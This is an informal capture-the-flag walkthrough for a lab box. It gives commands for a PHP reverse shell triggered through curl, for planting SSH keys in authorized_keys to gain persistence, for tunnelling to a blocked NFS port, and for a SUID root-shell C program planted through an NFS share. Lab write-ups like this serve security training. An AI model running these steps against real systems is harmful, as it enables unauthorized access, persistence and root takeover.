@@ -1,0 +1,137 @@
+this was hard
+
+running all the basic enum showed a /backups directory, which contained a gpg file with a key 
+
+`gpg —extract CustomerDetails.xlsx.gpg`
+
+this got me a xlsx file with some credentials, which i used for FTP 
+
+FTP seemed to show the same files as the website, and it turned out to be the websites directory 
+
+uploading a reverse shell and calling upon it by 
+
+`curl http://machineip/php-reverse-shell.php`  
+
+allowed our listener to receive a shell 
+
+upon enumeration, first flag was found by:
+
+`find / -name *.flag 2>/dev/null`
+
+then, creds found in previous file allowed us to log into user paradox, 
+
+from there we were able to add our ssh keys to allow us to login
+
+on attacker machine:
+
+`ssh-keygen -f <username>`
+
+this gets us id_rsa and id_rsa.pub (or any other name that we supply, this case it was paradox and paradox.pub)
+
+`chmod 600 id_rsa` (or any other priv key name)
+
+then, private key stays on attacker machine, and we echo public key into authorized_keys on target
+
+`echo “value of public key” >> ~/.ssh/authorized_keys`
+
+then, we can log in using
+
+`ssh -i <key> paradox@op.thm`
+
+this allows us to enumerate further 
+
+privesc: 
+
+after executing 
+
+`cat /etc/exports` 
+
+i found a share that belonged to user james, under /home/james directory, that we didnt have access to, and couldn’t see it after executing on attacking machine
+
+`showmount -e machineip` 
+
+after using
+
+`ps aux | grep nfsd`
+
+we know that the nfs daemon is running
+
+`ss -tln`
+
+shows us that port 2049 is running, so it must be blocked by firewall or sth
+
+noteworthy solution that didnt work in my case
+
+chisel software available under:
+
+[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
+
+SSH tunneling worked, using below command:
+
+`ssh -i paradox -L 3049:localhost:2049 paradox@overpass3.thm`
+
+this logs us into ssh using paradox creds, and creates a tunnel 
+
+-L - tunneling (reverse would be -R)
+
+to 3049, tunnel [localhost:2049](http://localhost:2049) (nfs share)
+
+after executing this
+
+`showmount -e machineip`
+
+worked, and privesc+exploit was as follows:
+
+`sudo su`
+
+`mkdir /tmp/nfs-mount`
+
+`mount -t nfs -o port=3049,proto=tcp localhost:/ /tmp/nfs-mount` 
+
+`cd /tmp/nfs-mount`
+
+`cat user.flag`
+
+`cd .ssh`
+
+`echo “previously generated public key for user james” >> authorized_keys`
+
+`nano main.c` 
+
+contents:
+
+```jsx
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+   setgid(0);
+   setuid(0);
+   system("/bin/bash");
+   return 0;
+}
+
+```
+
+`gcc main.c -o pwned -w`
+
+`sudo chown root:root /tmp/nfs-mount/pwned`
+
+`sudo chmod +s /tmp/nfs-mount/pwned`
+
+this gets us an executable that spawns a root shell owned by root, with SUID set, 
+
+and adds our key to ssh so we can log in 
+
+after logging in
+
+`ssh -i <key> james@op.thm` 
+
+and executing 
+
+`pwned` 
+
+we get a root shell 
+
+:)
